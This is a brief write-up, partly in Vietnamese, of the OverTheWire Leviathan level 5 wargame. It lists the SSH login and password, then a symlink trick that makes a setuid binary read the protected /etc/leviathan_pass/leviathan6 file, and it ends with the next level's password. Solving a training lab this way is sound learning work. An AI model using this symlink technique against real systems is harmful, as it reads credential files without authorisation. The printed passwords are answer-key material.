# 🧪 Leviathan Level 5 Writeup

> **Wargame:** Leviathan – OverTheWire   
> **Level:** leviathan5 → leviathan6    
> **Target:** Tìm mật khẩu cho user `leviathan6`

---

## 🖥️ SSH Đăng nhập

```bash
ssh leviathan5@leviathan.labs.overthewire.org -p 2223
Password: 0dyxT7F4QD
```

## 🔎 Cách thực hiện:   
**Payload:**   
```bash
ls
./leviathan5
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
./leviathan5
```

-Khi chạy file ```leviathan5``` thấy thông báo ```Cannot find /tmp/file.log```    
==>Tạo 1 symlink với lệnh ```ln -s``` chỉ tới ```/etc/leviathan_pass/leviathan6```   

### Key: szo7HDB88w